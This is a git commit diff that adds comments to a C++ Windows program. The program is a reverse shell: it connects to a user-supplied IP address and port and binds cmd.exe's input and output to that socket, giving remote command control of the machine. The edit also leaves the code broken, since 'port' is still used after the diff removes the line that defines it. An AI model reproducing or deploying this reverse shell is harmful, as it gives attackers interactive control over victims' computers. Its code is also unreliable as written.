2b33a74eb3f6490291e51f7b9da088b2af7a3cec
Joaquim Pedroza <71528875+Very-Bad-Goose@users.noreply.github.com>
2023-03-12 13:17:46 -0700

    Update main.cpp
    Added comments to code and updated formatting

--- main.cpp
+++ main.cpp
@@ -9,27 +9,33 @@ const int BUFFER_SIZE = 512;
 
 int main()
 {
+    // Initialize Winsock
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) throw std::runtime_error("WSAStartup failed");
 
-    std::string ip_addr, port_str;
+    // Get IP address and port number from user input
+    std::string ip_addr;
+    int port_str;
     std::cout << "Enter IP address: "; std::cin >> ip_addr;
     std::cout << "Enter port number: "; std::cin >> port_str;
-    int port = std::stoi(port_str);
 
+    // Create a socket
     SOCKET shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     if (shell == INVALID_SOCKET) throw std::runtime_error("Socket creation failed");
 
+    // Connect to the target server
     sockaddr_in shell_addr = {0};
     shell_addr.sin_family = AF_INET;
     shell_addr.sin_port = htons(port);
     InetPton(AF_INET, ip_addr.c_str(), &shell_addr.sin_addr);
     if (connect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) throw std::runtime_error("Connection to the target server failed");
 
+    // Receive data from the server
     char recv_buffer[BUFFER_SIZE] = {0};
     int bytes_received = recv(shell, recv_buffer, BUFFER_SIZE - 1, 0);
     if (bytes_received == SOCKET_ERROR) throw std::runtime_error("Error receiving data");
 
+    // Create a new process to execute the command shell
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
@@ -37,6 +43,7 @@ int main()
     si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
     if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) throw std::runtime_error("Failed to create process");
 
+    // Wait for the process to finish and clean up resources
     WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
